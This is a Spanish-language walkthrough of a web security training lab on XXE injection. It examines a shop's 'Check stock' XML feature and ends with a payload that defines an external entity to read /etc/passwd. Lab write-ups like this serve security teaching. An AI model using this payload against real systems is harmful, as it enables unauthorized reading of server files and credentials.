# Lab: Exploiting XXE using external entities to retrieve files

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

To solve the lab, inject an XML external entity to retrieve the contents of the `/etc/passwd` file.

![Practitioner](https://img.shields.io/badge/level-Apprentice-green) 

---


Iniciamos el laboratorio y nos encontramos con una aplicación de shopping:
![image](https://github.com/user-attachments/assets/56a61334-623e-4cfa-bd40-0b25b4550af0)

Accedemos a la descripción de un producto haciendo click en `View details`:
![image](https://github.com/user-attachments/assets/f8eae5bf-e647-4f4c-aff7-fb6974f55fee)

Este laboratorio nos dice que tiene una vulnerabilidad en la funcionalidad `Check stock`:
![image](https://github.com/user-attachments/assets/efc2f1da-39d8-411d-bcaa-bd09db8aa096)

Por lo que procedemos a analizarla:
![image](https://github.com/user-attachments/assets/e8f04b5b-299b-41ad-b709-99afa48379ff)

Esta captura muestra un escenario clásico y perfectamente explotable de XXE.

Estamos enviando información vía XML en la request:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```
El servidor responde con 759, lo que indica que interpreta y procesa correctamente el XML enviado.

Indicios:
- El servidor está procesando directamente el contenido XML que el cliente envía, lo cual es el punto de partida para probar inyecciones de entidades externas.

- No hay evidencias de validación ni sanitización del XML.

- Si el servidor usa un parser vulnerable que permite entidades externas, podríamos intentar algo como:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```



